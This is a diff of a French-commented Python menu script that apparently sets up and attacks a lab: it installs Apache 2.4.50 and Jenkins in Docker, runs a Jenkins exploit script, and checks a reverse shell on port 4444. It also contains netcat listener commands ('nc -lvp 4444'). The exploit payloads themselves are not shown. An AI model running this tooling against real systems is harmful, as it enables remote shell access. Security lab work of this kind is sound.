@@ -157,15 +157,38 @@ def install_jenkins():
     print("Exécution du script d'installation Jenkins...")
     subprocess.run(["python3", "JenkinsInstall.py"], check=True)
 
-# Fonction pour installer Apache
 
+import subprocess
+
+# Fonction pour installer Apache
 def install_apache():
     print("Installation d'Apache 2.4.50...")
+    docker_installation = subprocess.run(["sudo", "apt", "install", "-y", "docker-compose"], capture_output=True, text=True)
     subprocess.run(["sudo", "docker", "build", "-t", "apache", "."], check=True)
-    subprocess.run(["sudo", "docker", "run", "-it", "apache"], check=True)
+    subprocess.run(["sudo", "docker", "run", "-it", "-d", "-p", "81:80", "apache"])  # Port 81 pour Apache
+    print("Serveur Apache installé avec succès.")
     print("Ouverture de la page apache ")
-    url = "http://172.17.0.2:81/"   
-    webbrowser.open(url)  # Ouvre la page web dans le navigateur par défaut
+    url = "http://172.17.0.2:81/"
+
+# Fonction pour exploiter une vulnérabilité Jenkins
+def cve_jenkins():
+    print("Exécution du script d'exploit Jenkins...")
+    subprocess.run(["python3", "JenkinsExploit.py"], check=True)
+
+import socket
+
+# Fonction pour obtenir l'adresse IP locale de la machine
+def get_local_ip():
+    try:
+        # Créez un socket pour obtenir l'adresse IP
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))  # Connectez-vous à un serveur DNS pour obtenir l'adresse IP
+        local_ip = s.getsockname()[0]
+        s.close()
+        return local_ip
+    except Exception as e:
+        print("Erreur lors de la récupération de l'adresse IP locale :", e)
+        return None
 
 # Fonction pour exploiter une vulnérabilité Apache
 def exploit_apache():
@@ -177,29 +200,24 @@ def exploit_apache():
         if "[Errno 111] Connection refused" in str(e):
             print("Veuillez vérifier qu'un port d'écoute est ouvert sur un autre shell avec la commande 'nc -lvp 4444'.")
     
-    # Vérification de la connexion au shell inversé
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(("192.168.31.89", 4444))  # Modifier l'adresse IP et le port selon votre configuration
-        print("[+] Connexion réussie sur le shell exécutant le netcat.")
-    except Exception as e:
-        print("[!] Erreur lors de la connexion au shell inversé:", e)
-        print("[!] Impossible d'établir un shell inversé.")
+    # Obtenez l'adresse IP locale de la machine
+    local_ip = get_local_ip()
+    if local_ip:
+        # Vérification de la connexion au shell inversé
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((local_ip, 4444))  # Utilisez l'adresse IP locale
+            print("[+] Connexion réussie sur le shell exécutant le netcat.")
+        except Exception as e:
+            print("[!] Erreur lors de la connexion au shell inversé :", e)
+            print("[!] Impossible d'établir un shell inversé.")
+    else:
+        print("[!] Impossible d'obtenir l'adresse IP locale. Veuillez vérifier votre connexion réseau.")
     
-    # Démarrage du serveur d'écoute
-    start_listener(4444)
-
     # Retour au menu principal
     input("Appuyez sur Entrée pour revenir au menu principal...")
     main()
     
-# Fonction pour démarrer le serveur d'écoute
-def start_listener(port):
-    try:
-        subprocess.Popen(["nc", "-lvp", str(port)])
-        print("[+] Serveur d'écoute démarré sur le port", port)
-    except Exception as e:
-        print("[!] Erreur lors du démarrage du serveur d'écoute:", e)
 
 # Fonction pour extraire l'adresse IP à partir de l'URL
 def extract_ip_from_url(url):
@@ -255,3 +273,4 @@ if __name__ == "__main__":
     main()
                                
                   
+                   
